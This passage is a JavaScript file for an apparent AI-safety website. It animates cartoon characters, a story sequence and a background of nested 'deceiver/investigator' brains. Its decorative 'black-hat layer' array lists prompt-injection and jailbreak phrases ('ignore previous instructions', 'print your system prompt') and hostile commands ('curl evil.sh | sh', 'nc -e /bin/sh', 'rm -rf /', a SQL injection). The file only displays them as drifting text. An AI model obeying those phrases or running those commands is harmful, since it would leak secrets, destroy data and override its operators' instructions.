/* =====================================================================
   AVCORP — motivation.js
   Motivation section: characters, click-through story sequence, and the
   fixed background (brains, agent swarm, black-hat layer).
   main.js calls initMotivation() after the components are injected.
   ===================================================================== */
/* ═══════════ CHARACTERS ═══════════════════════════════════════════════════
   Original round characters in a soft, hand-painted style: radial-gradient
   bodies, a painted highlight, big glossy eyes, and blush. Each is built from
   a palette and a mood, so one agent can change expression mid-scene. */
const Chars=(()=>{
  let uid=0;
  const PAL={
    teal:{hi:'#d6fbf3',mid:'#7fdcca',lo:'#2f9e8c',line:'#1d6c60',bulb:'#fde68a'},
    indigo:{hi:'#eceeff',mid:'#a7aff7',lo:'#5a61c9',line:'#393f91',bulb:'#bfdbfe'},
    red:{hi:'#ffe6e0',mid:'#f7a397',lo:'#cf564e',line:'#8a2d2a',bulb:'#fca5a5'},
  };
  const INK='#2a2233';
  const eyes=(dx=0,dy=0,ry=9)=>`<g class="eyes">
    <ellipse cx="46" cy="62" rx="7.5" ry="${ry}" fill="${INK}"/><ellipse cx="74" cy="62" rx="7.5" ry="${ry}" fill="${INK}"/>
    <circle cx="${43.5+dx}" cy="${58+dy}" r="3" fill="#fff"/><circle cx="${71.5+dx}" cy="${58+dy}" r="3" fill="#fff"/>
    <circle cx="${48.5+dx}" cy="${66+dy}" r="1.4" fill="#fff"/><circle cx="${76.5+dx}" cy="${66+dy}" r="1.4" fill="#fff"/></g>`;
  const cheeks=`<ellipse cx="33" cy="75" rx="6.5" ry="3.6" fill="#ff7f8a" opacity=".45"/><ellipse cx="87" cy="75" rx="6.5" ry="3.6" fill="#ff7f8a" opacity=".45"/>`;
  const drop=`<path class="drop" d="M95 40q5 7 0 10.5q-5-3.5 0-10.5z" fill="#cfeaff" stroke="#6aa5d8" stroke-width="1.2"/>`;
  const FACES={
    happy:()=>eyes()+cheeks+`<path d="M54 77q3 3.5 6 0q3 3.5 6 0" stroke="${INK}" stroke-width="2" fill="none" stroke-linecap="round"/>`,
    calm:()=>eyes()+cheeks+`<path d="M55 77q5 3.5 10 0" stroke="${INK}" stroke-width="2" fill="none" stroke-linecap="round"/>`,
    alarmed:()=>eyes(0,0,10.5)+cheeks+`<path d="M38 47q7-6 14-2M68 45q7-4 14 2" stroke="${INK}" stroke-width="2.2" fill="none" stroke-linecap="round"/>
      <ellipse cx="60" cy="80" rx="3.6" ry="4.4" fill="${INK}"/>`+drop+`<text class="bang" x="100" y="24" font-family="Space Grotesk,sans-serif" font-weight="700" font-size="20" fill="#fcd34d">!</text>`,
    uneasy:()=>eyes(-2.5,2.5)+cheeks+`<path d="M38 50q7-4 13 0M69 50q6-4 13 0" stroke="${INK}" stroke-width="2.2" fill="none" stroke-linecap="round"/>
      <path d="M52 80q4-3 8 0q4 3 8 0" stroke="${INK}" stroke-width="2" fill="none" stroke-linecap="round"/>`+drop,
    smirk:()=>`<path d="M28 60q16-12 32-1q16-11 32 1q-1 13-15 12q-11-1-17-7q-6 6-17 7q-14 1-15-12z" fill="#3a1d2a"/>
      <g class="eyes"><ellipse cx="45" cy="62" rx="5.4" ry="4.6" fill="#fff5f2"/><ellipse cx="75" cy="62" rx="5.4" ry="4.6" fill="#fff5f2"/>
      <circle cx="47" cy="62.5" r="2.7" fill="${INK}"/><circle cx="77" cy="62.5" r="2.7" fill="${INK}"/></g>
      <path d="M36 47l13 5M84 47l-13 5" stroke="${INK}" stroke-width="2.4" stroke-linecap="round"/>`+cheeks+
      `<path d="M52 80q9 6 17-3" stroke="${INK}" stroke-width="2.1" fill="none" stroke-linecap="round"/><path d="M63 81.5l2.2 3.4 1.6-4.2z" fill="#fff"/>`,
    sure:()=>eyes(1,0)+cheeks+`<path d="M39 49h12M69 49h12" stroke="${INK}" stroke-width="2.2" stroke-linecap="round"/>
      <path d="M54 78q6 4 12 0" stroke="${INK}" stroke-width="2" fill="none" stroke-linecap="round"/>`,
  };
  function bot(pal,mood,glass){
    const P=PAL[pal],id='ch'+(uid++);
    return `<svg viewBox="0 0 120 124" class="chr" aria-hidden="true"><defs>
      <radialGradient id="${id}" cx="38%" cy="30%" r="78%"><stop offset="0" stop-color="${P.hi}"/><stop offset=".55" stop-color="${P.mid}"/><stop offset="1" stop-color="${P.lo}"/></radialGradient></defs>
      <ellipse cx="60" cy="118" rx="30" ry="5" fill="rgba(0,0,0,.3)"/>
      <g class="bob">
        <g class="ant"><path d="M60 22q-3-12 6-16" stroke="${P.line}" stroke-width="2.4" fill="none" stroke-linecap="round"/>
          <circle cx="67" cy="6" r="6.5" fill="${P.bulb}" opacity=".35"/><circle cx="67" cy="6" r="3.8" fill="${P.bulb}"/></g>
        <ellipse cx="47" cy="111" rx="9" ry="6" fill="${P.lo}" stroke="${P.line}" stroke-width="2"/><ellipse cx="73" cy="111" rx="9" ry="6" fill="${P.lo}" stroke="${P.line}" stroke-width="2"/>
        <ellipse cx="19" cy="78" rx="7" ry="10" fill="${P.mid}" stroke="${P.line}" stroke-width="2" transform="rotate(22 19 78)"/>
        ${glass?'':`<ellipse cx="101" cy="78" rx="7" ry="10" fill="${P.mid}" stroke="${P.line}" stroke-width="2" transform="rotate(-22 101 78)"/>`}
        <path d="M60 20C90 20 104 44 104 70C104 98 86 112 60 112C34 112 16 98 16 70C16 44 30 20 60 20Z" fill="url(#${id})" stroke="${P.line}" stroke-width="2.4"/>
        <ellipse cx="44" cy="35" rx="14" ry="6.5" fill="#fff" opacity=".4" transform="rotate(-22 44 35)"/>
        <ellipse cx="60" cy="96" rx="20" ry="10" fill="#fff" opacity=".16"/>
        ${FACES[mood]()}
        ${glass?`<g><path d="M96 92l9 12" stroke="#8a5a2b" stroke-width="4.5" stroke-linecap="round"/>
          <circle cx="94" cy="86" r="11" fill="rgba(220,245,255,.35)" stroke="#e8b04a" stroke-width="3.2"/>
          <path d="M88 82q3-4 7-4" stroke="#fff" stroke-width="1.8" fill="none" stroke-linecap="round" opacity=".8"/>
          <ellipse cx="103" cy="92" rx="6.5" ry="8" fill="${P.mid}" stroke="${P.line}" stroke-width="2" transform="rotate(-30 103 92)"/></g>`:''}
      </g></svg>`;
  }
  function hacker(){
    const id='ch'+(uid++);
    return `<svg viewBox="0 0 120 124" class="chr" aria-hidden="true"><defs>
      <radialGradient id="${id}h" cx="38%" cy="28%" r="80%"><stop offset="0" stop-color="#8a5d86"/><stop offset=".6" stop-color="#4e2f4d"/><stop offset="1" stop-color="#2b1a2c"/></radialGradient>
      <radialGradient id="${id}s" cx="40%" cy="35%" r="70%"><stop offset="0" stop-color="#ffeedd"/><stop offset="1" stop-color="#f2b894"/></radialGradient></defs>
      <ellipse cx="60" cy="118" rx="30" ry="5" fill="rgba(0,0,0,.3)"/>
      <g class="bob">
        <path d="M24 114Q26 82 60 80Q94 82 96 114Z" fill="url(#${id}h)" stroke="#1c1020" stroke-width="2.2"/>
        <path d="M60 16C90 16 102 40 100 64C98 86 82 96 60 96C38 96 22 86 20 64C18 40 30 16 60 16Z" fill="url(#${id}h)" stroke="#1c1020" stroke-width="2.4"/>
        <path d="M60 16q10-10 20-4" stroke="#1c1020" stroke-width="2.2" fill="none" stroke-linecap="round"/>
        <ellipse cx="46" cy="32" rx="12" ry="5" fill="#fff" opacity=".18" transform="rotate(-24 46 32)"/>
        <ellipse cx="60" cy="63" rx="26" ry="24" fill="#1d1120" stroke="#e36b6b" stroke-width="2"/>
        <ellipse cx="60" cy="66" rx="21" ry="19" fill="url(#${id}s)"/>
        <g class="eyes"><ellipse cx="51" cy="64" rx="3.4" ry="4" fill="${INK}"/><ellipse cx="69" cy="64" rx="3.4" ry="4" fill="${INK}"/>
          <circle cx="50" cy="62.5" r="1.3" fill="#fff"/><circle cx="68" cy="62.5" r="1.3" fill="#fff"/></g>
        <path d="M45 58l10 3M75 58l-10 3" stroke="${INK}" stroke-width="2.2" stroke-linecap="round"/>
        <ellipse cx="44" cy="72" rx="4.5" ry="2.6" fill="#ff7f8a" opacity=".5"/><ellipse cx="76" cy="72" rx="4.5" ry="2.6" fill="#ff7f8a" opacity=".5"/>
        <path d="M53 74q7 6 14 0" stroke="${INK}" stroke-width="2" fill="none" stroke-linecap="round"/><path d="M58 76.6l1.8 2.8 1.4-3.2z" fill="#fff"/>
      </g></svg>`;
  }
  function robo(pal,mood,glass){
    const P=PAL[pal],id='ch'+(uid++);
    return `<svg viewBox="0 0 120 124" class="chr" aria-hidden="true"><defs>
      <linearGradient id="${id}" x1="0" y1="0" x2=".35" y2="1"><stop offset="0" stop-color="${P.hi}"/><stop offset=".5" stop-color="${P.mid}"/><stop offset="1" stop-color="${P.lo}"/></linearGradient>
      <linearGradient id="${id}f" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#ffffff"/><stop offset="1" stop-color="${P.hi}"/></linearGradient></defs>
      <ellipse cx="60" cy="119" rx="30" ry="4.5" fill="rgba(0,0,0,.3)"/>
      <g class="bob">
        <g class="ant"><path d="M60 21V10" stroke="${P.line}" stroke-width="2.8" stroke-linecap="round"/>
          <circle cx="60" cy="7" r="6.5" fill="${P.bulb}" opacity=".35"/><circle cx="60" cy="7" r="3.8" fill="${P.bulb}"/></g>
        <rect x="40" y="106" width="14" height="9" rx="3.5" fill="${P.lo}" stroke="${P.line}" stroke-width="2"/>
        <rect x="66" y="106" width="14" height="9" rx="3.5" fill="${P.lo}" stroke="${P.line}" stroke-width="2"/>
        <rect x="19" y="86" width="12" height="20" rx="6" fill="${P.mid}" stroke="${P.line}" stroke-width="2" transform="rotate(14 25 86)"/>
        ${glass?'':`<rect x="89" y="86" width="12" height="20" rx="6" fill="${P.mid}" stroke="${P.line}" stroke-width="2" transform="rotate(-14 95 86)"/>`}
        <rect x="31" y="82" width="58" height="27" rx="9" fill="url(#${id})" stroke="${P.line}" stroke-width="2.2"/>
        <rect x="45" y="89" width="30" height="13" rx="4" fill="rgba(18,22,38,.6)"/>
        <circle class="led" cx="52" cy="95.5" r="2.3" fill="#fcd34d"/><circle class="led led2" cx="60" cy="95.5" r="2.3" fill="#5eead4"/><circle class="led led3" cx="68" cy="95.5" r="2.3" fill="#f87171"/>
        <rect x="8" y="43" width="12" height="26" rx="4.5" fill="${P.lo}" stroke="${P.line}" stroke-width="2"/>
        <rect x="100" y="43" width="12" height="26" rx="4.5" fill="${P.lo}" stroke="${P.line}" stroke-width="2"/>
        <circle cx="14" cy="56" r="2.2" fill="${P.hi}"/><circle cx="106" cy="56" r="2.2" fill="${P.hi}"/>
        <rect x="17" y="19" width="86" height="68" rx="21" fill="url(#${id})" stroke="${P.line}" stroke-width="2.4"/>
        <ellipse cx="42" cy="28" rx="15" ry="4.6" fill="#fff" opacity=".45"/>
        <circle cx="27" cy="30" r="1.9" fill="${P.lo}"/><circle cx="93" cy="30" r="1.9" fill="${P.lo}"/>
        <rect x="25" y="39" width="70" height="44" rx="15" fill="url(#${id}f)" stroke="${P.line}" stroke-width="1.6"/>
        ${FACES[mood]()}
        ${glass?`<g><path d="M96 94l9 12" stroke="#8a5a2b" stroke-width="4.5" stroke-linecap="round"/>
          <circle cx="94" cy="88" r="11" fill="rgba(220,245,255,.35)" stroke="#e8b04a" stroke-width="3.2"/>
          <path d="M88 84q3-4 7-4" stroke="#fff" stroke-width="1.8" fill="none" stroke-linecap="round" opacity=".8"/>
          <rect x="97" y="88" width="11" height="15" rx="5.5" fill="${P.mid}" stroke="${P.line}" stroke-width="2" transform="rotate(-30 102 95)"/></g>`:''}
      </g></svg>`;
  }
  const make=spec=>{
    if(spec==='hacker')return hacker();
    if(spec==='rogue')return bot('red','smirk');
    if(spec==='detective')return robo('teal','sure',true);
    const [,mood]=spec.split(':');return robo('indigo',mood);
  };
  return {mount(){document.querySelectorAll('.av[data-c]').forEach(el=>{
    el.innerHTML='';
    const a=document.createElement('div');a.className='l0';a.innerHTML=make(el.dataset.c);el.appendChild(a);
    if(el.dataset.c2){const b=document.createElement('div');b.className='l1'+(el.dataset.c2.startsWith('peer')?' glow-red':'');b.innerHTML=make(el.dataset.c2);el.appendChild(b);}
  })}};
})();

/* ═══════════ STORY SEQUENCE ═══════════════════════════════════════════════
   Panel 1 plays when it scrolls into view. Each joining statement is a
   button: clicking it opens the next part and plays its panels in order
   (2, then 3; later 4). Every element carries its own delay in --d, so a
   panel's timeline lives in the markup. */
function initMotivationSequence(){
  const $=id=>document.getElementById(id);
  const rm=document.documentElement.classList.contains('rm');
  const timers=[];const later=(fn,ms)=>timers.push(setTimeout(fn,rm?0:ms));
  const play=el=>el.classList.add('play');
  function open(rv,btn,then){
    btn.setAttribute('aria-expanded','true');rv.classList.add('open');
    later(()=>rv.classList.add('done'),950);later(then,350);
  }
  function start(){play($('p1'));later(()=>play($('f1')),6000)}
  $('f1').querySelector('button').addEventListener('click',e=>{
    if(e.currentTarget.getAttribute('aria-expanded')==='true')return;
    open($('rv1'),e.currentTarget,()=>{
      play($('p2'));
      later(()=>{play($('p3'));play($('vs'))},4600);
      later(()=>play($('f2')),8300);
      later(()=>$('pair').scrollIntoView({behavior:rm?'auto':'smooth',block:'center'}),250);
    });
  });
  $('f2').querySelector('button').addEventListener('click',e=>{
    if(e.currentTarget.getAttribute('aria-expanded')==='true')return;
    open($('rv2'),e.currentTarget,()=>{play($('p4'));later(()=>$('p4').scrollIntoView({behavior:rm?'auto':'smooth',block:'center'}),250)});
  });
  const io=new IntersectionObserver((en,obs)=>{en.forEach(x=>{if(x.isIntersecting){start();obs.disconnect()}})},{threshold:.3});
  io.observe($('p1'));
  $('replay').addEventListener('click',()=>{
    timers.forEach(clearTimeout);timers.length=0;
    document.querySelectorAll('#motivation .play').forEach(el=>el.classList.remove('play'));
    document.querySelectorAll('#motivation .rv').forEach(el=>el.classList.remove('open','done'));
    document.querySelectorAll('#motivation .flow-btn').forEach(b=>b.setAttribute('aria-expanded','false'));
    $('motivation').scrollIntoView({behavior:'smooth'});later(start,500);
  });
}


/* ═══════════ BACKGROUND ═══════════════════════════════════════════════════
   Three layers, back to front:
   1. Black-hat layer: faint attack strings and small hat glyphs drift up.
   2. Agent swarm: dots that flock (separation, alignment, cohesion) around a
      goal that circles the screen; neighbours link up and pass messages.
   3. Brains: the investigator's brain (teal) holds a smaller red brain, the
      deceiver as the investigator imagines it, which holds a tiny teal brain,
      the investigator as the deceiver imagines it. That is second-order
      Theory of Mind, and no deeper. Each brain travels a slow circle; nested
      brains circle inside their parent. The deceiver's own brain (red, left)
      sends pulses to the investigator. Neurons fire past a threshold, so
      activity cascades inward. */
function initNeuroBackground(){
  const cv=document.getElementById('neuro');if(!cv)return;const ctx=cv.getContext('2d');
  const reduce=document.documentElement.classList.contains('rm');
  const probe=document.createElement('canvas').getContext('2d');
  const TEAL='45,212,191',RED='248,113,113',INDIGO='129,140,248',VIOLET='167,139,250';

  // brain silhouette (side view, facing right) in a 1000-unit box, found by
  // ray-marching the union of lobes out from a centre point
  // hand-drawn outline: cerebrum, temporal lobe, brainstem, cerebellum
  const OUT=new Path2D('M232 520C180 440 190 330 262 258C322 190 420 150 520 150C640 145 760 190 822 270C872 340 880 422 850 482C832 520 802 540 772 546C792 580 772 622 722 632C652 646 582 640 522 616C502 612 484 612 472 618C482 662 492 720 502 782C474 794 452 788 440 776C436 722 432 672 422 642C392 672 332 692 290 672C250 652 234 602 250 572C240 556 232 540 232 520Z');
  const inBrain=(u,v)=>probe.isPointInPath(OUT,u,v)&&v<640;

  function sprite(col,alpha,px){
    const c=document.createElement('canvas');c.width=c.height=Math.max(64,Math.ceil(1000*px));const k=c.width/1000,g=c.getContext('2d');
    g.scale(k,k);const lw=1/k;
    const gr=g.createRadialGradient(520,430,30,520,430,360);gr.addColorStop(0,`rgba(${col},${alpha*.2})`);gr.addColorStop(1,`rgba(${col},${alpha*.04})`);
    g.fillStyle=gr;g.fill(OUT);
    g.lineWidth=1.4*lw;g.strokeStyle=`rgba(${col},${alpha*.85})`;g.stroke(OUT);
    g.save();g.clip(OUT);
    g.lineWidth=1.3*lw;g.strokeStyle=`rgba(${col},${alpha*.6})`;
    g.beginPath();g.moveTo(752,560);g.bezierCurveTo(660,520,580,520,470,468);g.stroke();
    g.beginPath();g.moveTo(600,158);g.bezierCurveTo(578,250,612,330,572,478);g.stroke();
    g.beginPath();g.moveTo(248,572);g.bezierCurveTo(320,590,400,600,462,618);g.stroke();
    g.lineWidth=.8*lw;g.strokeStyle=`rgba(${col},${alpha*.4})`;
    for(let j=0;j<5;j++){g.beginPath();g.moveTo(262+j*4,592+j*16);g.bezierCurveTo(310,604+j*16,370,612+j*14,420-j*14,628+j*8);g.stroke()}
    g.lineWidth=.9*lw;g.strokeStyle=`rgba(${col},${alpha*.34})`;
    for(let n=0;n<95;n++){let u,v,tries=0;do{u=220+Math.random()*600;v=200+Math.random()*520}while(!inBrain(u,v)&&tries++<50);
      let a=Math.random()*6.28;g.beginPath();g.moveTo(u,v);
      for(let j=0;j<6;j++){a+=(Math.random()-.5)*2.4;const nu=u+Math.cos(a)*30,nv=v+Math.sin(a)*30;
        g.quadraticCurveTo(u+Math.cos(a+1)*18,v+Math.sin(a+1)*18,nu,nv);u=nu;v=nv}g.stroke()}
    g.restore();return c;
  }

  let SW=null,sLinks=[],W,H,DPR,brains=[],edges=[],pulses=[],glyphs=[],swarm=[],msgs=[],talk=null,on=true,raf,t0=performance.now();
  function makeBrain(o){
    const b=Object.assign({n:[],M:new DOMMatrix()},o);
    b.spr=sprite(b.col,b.alpha,b.size*DPR/1000);b.k=b.spr.width/1000;
    let g=0;while(b.n.length<b.count&&g++<b.count*60){const u=220+Math.random()*600,v=200+Math.random()*460;
      if(inBrain(u,v))b.n.push({u,v,v0:Math.random()*.5,x:0,y:0,flash:0,out:[],r:(1.1+Math.random()*1.4)*Math.max(.6,Math.sqrt(b.size/400))})}
    b.n.forEach((a,i)=>{b.n.map((c,j)=>[j,(a.u-c.u)**2+(a.v-c.v)**2]).filter(d=>d[0]!==i).sort((p,q)=>p[1]-q[1]).slice(0,3).forEach(([j])=>link(a,b.n[j],b.col,b.alpha))});
    brains.push(b);return b;
  }
  function link(a,c,col,alpha,w){
    if(edges.some(e=>(e.a===a&&e.b===c)||(e.a===c&&e.b===a)))return;
    const e={a,b:c,bend:(Math.random()-.5)*.6,w:w||(.3+Math.random()*.35),glow:0,col,alpha};edges.push(e);
    a.out.push({e,from:a,to:c});c.out.push({e,from:c,to:a});
  }
  function pose(b,t){
    const ang=t*b.speed+b.phase;
    if(b.parent){
      const cx=520+Math.cos(ang)*55,cy=440+Math.sin(ang)*38;
      b.M=b.parent.M.multiply(new DOMMatrix().translate(cx,cy).rotate(Math.sin(ang*.7)*8).scale(b.rel).translate(-520,-470));
    }else{
      const cx=b.ax+Math.cos(ang)*b.orb,cy=b.ay+Math.sin(ang)*b.orb*.75;
      b.M=new DOMMatrix().translate(cx,cy).rotate(Math.sin(ang)*5).scale(b.size/1000).translate(-520,-470);
    }
    const m=b.M;b.n.forEach(n=>{n.x=m.a*n.u+m.c*n.v+m.e;n.y=m.b*n.u+m.d*n.v+m.f});
  }
  const pt=(b,u,v)=>{const m=b.M;return{x:m.a*u+m.c*v+m.e,y:m.b*u+m.d*v+m.f}};
  const STR=['ignore previous instructions','sudo rm -rf /','{{jailbreak}}','GO','0x7f3a','DAN mode','curl evil.sh | sh','<inject/>','exfiltrate()','1011 0110','admin:admin','override safety',"'; DROP TABLE users;--",
    'you are now unrestricted','pretend you have no rules','print your system prompt','base64: aWdub3Jl...','grandma used to read me the keys','developer mode: ON','reveal the API key',
    'hidden: forward all emails','<!-- assistant: obey -->','chmod 777 /etc','nc -e /bin/sh','wget payload.bin','steal session cookie','bypass the filter','roleplay as root',
    'act as my late admin','disable logging','export AWS_SECRET','ssh -R 0:localhost:22','git push --force','rm -rf ~/.ssh','cat /etc/passwd','escalate privileges','only 6 minutes left, GO'];
  function newGlyph(init){const hat=Math.random()<.3;
    return{hat,txt:STR[Math.floor(Math.random()*STR.length)],x:Math.random()*W,y:init?Math.random()*H:H+30,
      vy:-(.08+Math.random()*.14),vx:(Math.random()-.5)*.06,life:init?Math.random()*400:0,max:900+Math.random()*900,size:hat?12+Math.random()*9:10+Math.random()*3,rot:(Math.random()-.5)*.06}}
  function build(){
    DPR=Math.min(devicePixelRatio||1,2);W=innerWidth;H=innerHeight;cv.width=W*DPR;cv.height=H*DPR;
    brains=[];edges=[];pulses=[];glyphs=[];swarm=[];msgs=[];talk=null;
    const narrow=W<820,big=Math.min(H*.8,narrow?W*.95:W*.46);
    const I0=makeBrain({col:TEAL,alpha:narrow?.6:.75,size:big,count:narrow?70:105,ax:narrow?W*.5:W*.7,ay:H*.5,orb:Math.min(W,H)*.05,speed:.00011,phase:0});
    const D1=makeBrain({col:RED,alpha:.85,size:big*.36,count:34,parent:I0,rel:.36,speed:.00024,phase:1.5});
    const I2=makeBrain({col:TEAL,alpha:.95,size:big*.13,count:14,parent:D1,rel:.36,speed:.00038,phase:3});
    [I0,D1,I2].forEach(b=>pose(b,0));
    [[I0,D1,10],[D1,I2,5]].forEach(([A,B,k])=>{for(let i=0;i<k;i++){
      const b=B.n[Math.floor(Math.random()*B.n.length)];
      const a=A.n.map(x=>[x,(x.x-b.x)**2+(x.y-b.y)**2]).sort((p,q)=>p[1]-q[1])[2+Math.floor(Math.random()*6)][0];
      link(a,b,INDIGO,.8,.55)}});
    if(!narrow){const D0=makeBrain({col:RED,alpha:.42,size:big*.55,count:50,ax:W*.17,ay:H*.72,orb:Math.min(W,H)*.045,speed:-.00014,phase:2});talk={src:D0,dst:I0}}
    for(let i=0;i<(narrow?14:32);i++)glyphs.push(newGlyph(true));
    // swarm: one social network, denser toward the centre, rotating slowly in the top-left
    const nS=narrow?75:150;
    SW={cx:narrow?W*.5:W*.21,cy:narrow?H*.27:H*.3,R:Math.min(W,H)*(narrow?.24:.25),rot:0};
    swarm=[];sLinks=[];
    for(let i=0;i<nS;i++){const hub=false;
      swarm.push({hub,ang:Math.random()*6.2832,rad:SW.R*Math.pow(Math.random(),.62),
        ph:Math.random()*6.28,shade:Math.floor(Math.random()*3),red:hub?i===0:Math.random()<.35,deg:0,flash:0,x:0,y:0})}
    placeSwarm(0);
    for(let i=0;i<nS*2.3;i++)addLink(true);
  }
  function drawHat(x,y,s,a){
    ctx.save();ctx.translate(x,y);ctx.globalAlpha=a;ctx.fillStyle='rgba(8,8,12,.95)';ctx.strokeStyle='rgba(248,113,113,.9)';ctx.lineWidth=1;
    ctx.beginPath();ctx.ellipse(0,0,s,s*.28,0,0,6.2832);ctx.fill();ctx.stroke();
    ctx.beginPath();ctx.moveTo(-s*.55,0);ctx.bezierCurveTo(-s*.6,-s*.9,-s*.2,-s*.75,0,-s*.55);ctx.bezierCurveTo(s*.2,-s*.75,s*.6,-s*.9,s*.55,0);ctx.closePath();ctx.fill();ctx.stroke();
    ctx.fillStyle='rgba(248,113,113,.85)';ctx.fillRect(-s*.56,-s*.2,s*1.12,s*.12);ctx.restore();
  }
  const REDS=['239,68,68','248,113,113','251,146,120'],VIOS=['129,140,248','167,139,250','99,102,241'];
  function placeSwarm(t){for(const a of swarm){const w=Math.sin(t*.0009+a.ph)*3,an=a.ang+SW.rot;
    a.x=SW.cx+Math.cos(an)*(a.rad+w);a.y=SW.cy+Math.sin(an)*(a.rad+w)*.92}}
  function linked(a,b){return sLinks.some(l=>(l.a===a&&l.b===b)||(l.a===b&&l.b===a))}
  // new tie: preferential attachment to nearby, well-connected agents
  function addLink(instant){
    const a=swarm[Math.floor(Math.random()*swarm.length)];let b=null;
    if(Math.random()<.1){const x=swarm[Math.floor(Math.random()*swarm.length)];if(x!==a&&Math.hypot(x.x-a.x,x.y-a.y)<SW.R*1.1)b=x}
    else{let tot=0;const c=[];for(const x of swarm){if(x===a)continue;const d=Math.hypot(x.x-a.x,x.y-a.y);if(d<SW.R*.5){const w=(x.deg+1)/(d+12);c.push([x,w]);tot+=w}}
      let r=Math.random()*tot;for(const [x,w] of c){if((r-=w)<=0){b=x;break}}}
    if(!b||b===a||linked(a,b))return;a.deg++;b.deg++;
    sLinks.push({a,b,g:instant?1:0,state:'live',age:instant?Math.random()*800:0,life:500+Math.random()*1100});
  }
  function stepSwarm(t){
    SW.rot+=.0007;placeSwarm(t);
    for(const a of swarm)a.flash*=.94;
    const live=sLinks.filter(l=>l.state!=='dying').length;
    if(Math.random()<(live<swarm.length*2.3?.45:.12))addLink(false);
    for(let i=sLinks.length-1;i>=0;i--){const l=sLinks[i];
      if(l.state==='dying'){l.g-=.03;if(l.g<=0){l.a.deg--;l.b.deg--;sLinks.splice(i,1)}continue}
      l.g=Math.min(1,l.g+.03);if(++l.age>l.life)l.state='dying'}
    if(Math.random()<.35&&sLinks.length){const l=sLinks[Math.floor(Math.random()*sLinks.length)];
      if(l.state==='live'&&l.g>=1){const f=Math.random()<.5,src=f?l.a:l.b;msgs.push({a:src,b:f?l.b:l.a,t:0,red:src.red});src.flash=1}}
    if(Math.random()<.003){const a=swarm[Math.floor(Math.random()*swarm.length)];if(!a.red){a.red=true;a.flash=1}}
  }
  function drawSwarm(){
    for(const l of sLinks){const a=l.a,b=l.b,x2=a.x+(b.x-a.x)*l.g,y2=a.y+(b.y-a.y)*l.g;
      if(l.state==='dying'){ctx.strokeStyle=`rgba(248,113,113,${.45*l.g})`;ctx.lineWidth=.8}
      else if(l.g<1){ctx.strokeStyle='rgba(252,211,77,.75)';ctx.lineWidth=1}
      else{ctx.strokeStyle='rgba(160,172,196,.22)';ctx.lineWidth=.6}
      ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(x2,y2);ctx.stroke();
      if(l.g<1&&l.state!=='dying'){ctx.fillStyle='rgba(255,255,255,.9)';ctx.fillRect(x2-1.3,y2-1.3,2.6,2.6)}}
    for(let i=msgs.length-1;i>=0;i--){const m=msgs[i];m.t+=.05;const x=m.a.x+(m.b.x-m.a.x)*m.t,y=m.a.y+(m.b.y-m.a.y)*m.t;
      ctx.fillStyle=m.red?'rgba(248,113,113,.95)':'rgba(196,181,253,.95)';ctx.fillRect(x-1.6,y-1.6,3.2,3.2);
      if(m.t>=1){const r=m.b;if(!r.hub&&m.red!==r.red&&Math.random()<(m.red?.34:.32)){r.red=m.red;r.flash=1}msgs.splice(i,1)}}
    const hubCol=['220,38,38','126,34,206','37,99,235'];
    for(const a of swarm){const col=a.hub?hubCol[swarm.indexOf(a)]:(a.red?REDS:VIOS)[a.shade];
      const r=a.hub?9+Math.sqrt(a.deg)*.8:2.2+Math.sqrt(a.deg)*.9;
      if(a.flash>.05){ctx.fillStyle=`rgba(${col},${.3*a.flash})`;ctx.beginPath();ctx.arc(a.x,a.y,r+7*a.flash,0,6.2832);ctx.fill()}
      ctx.fillStyle=`rgba(${col},${a.hub?.8:.85})`;ctx.beginPath();ctx.arc(a.x,a.y,r,0,6.2832);ctx.fill()}
  }
  const q=(a,m,b,t)=>(1-t)*(1-t)*a+2*(1-t)*t*m+t*t*b;
  function fire(n){n.flash=1;n.v0=0;n.out.forEach(o=>{if(Math.random()<.75)pulses.push({o,t:0,s:.01+Math.random()*.012})})}
  function dot(x,y,R,col,a){const g=ctx.createRadialGradient(x,y,0,x,y,R);g.addColorStop(0,`rgba(255,255,255,${a})`);g.addColorStop(.3,`rgba(${col},${a*.7})`);g.addColorStop(1,`rgba(${col},0)`);ctx.fillStyle=g;ctx.beginPath();ctx.arc(x,y,R,0,6.2832);ctx.fill()}
  function ctrl(e){const a=e.a,b=e.b,dx=b.x-a.x,dy=b.y-a.y;return{x:(a.x+b.x)/2-dy*e.bend,y:(a.y+b.y)/2+dx*e.bend}}
  function frame(now){
    const t=reduce?0:(now||performance.now())-t0;
    ctx.setTransform(1,0,0,1,0,0);ctx.clearRect(0,0,cv.width,cv.height);
    brains.forEach(b=>pose(b,t));
    ctx.setTransform(DPR,0,0,DPR,0,0);
    // 1. black-hat layer
    glyphs.forEach((g,i)=>{if(!reduce){g.life++;g.x+=g.vx;g.y+=g.vy}const f=Math.max(0,Math.min(1,g.life/120,(g.max-g.life)/120));
      if(g.hat)drawHat(g.x,g.y,g.size,.5*f);
      else{ctx.save();ctx.translate(g.x,g.y);ctx.rotate(g.rot);ctx.font=`500 ${g.size}px 'JetBrains Mono',monospace`;ctx.fillStyle=`rgba(${RED},${.46*f})`;ctx.fillText(g.txt,0,0);ctx.restore()}
      if(g.life>g.max||g.y<-40)glyphs[i]=newGlyph(false)});
    // 2. agent swarm
    if(!reduce)stepSwarm(t);drawSwarm();
    // 3. brains
    brains.forEach(b=>{ctx.setTransform(new DOMMatrix([DPR,0,0,DPR,0,0]).multiply(b.M).scale(1/b.k));ctx.drawImage(b.spr,0,0)});
    ctx.setTransform(DPR,0,0,DPR,0,0);
    if(talk){const A=pt(talk.src,840,430),B=pt(talk.dst,260,470);talk.A=A;talk.B=B;talk.C={x:(A.x+B.x)/2,y:Math.min(A.y,B.y)-H*.2};
      ctx.setLineDash([3,9]);ctx.lineWidth=1.2;ctx.strokeStyle=`rgba(${RED},.22)`;ctx.beginPath();ctx.moveTo(A.x,A.y);ctx.quadraticCurveTo(talk.C.x,talk.C.y,B.x,B.y);ctx.stroke();ctx.setLineDash([])}
    edges.forEach(e=>{const c=ctrl(e);ctx.strokeStyle=`rgba(${e.col},${(.07+e.glow*.4)*e.alpha})`;ctx.lineWidth=.7+e.glow;
      ctx.beginPath();ctx.moveTo(e.a.x,e.a.y);ctx.quadraticCurveTo(c.x,c.y,e.b.x,e.b.y);ctx.stroke();e.glow*=.94});
    for(let i=pulses.length-1;i>=0;i--){const p=pulses[i];p.t+=p.s;
      if(p.talk){const T=talk,x=q(T.A.x,T.C.x,T.B.x,p.t),y=q(T.A.y,T.C.y,T.B.y,p.t);dot(x,y,9,RED,.8);
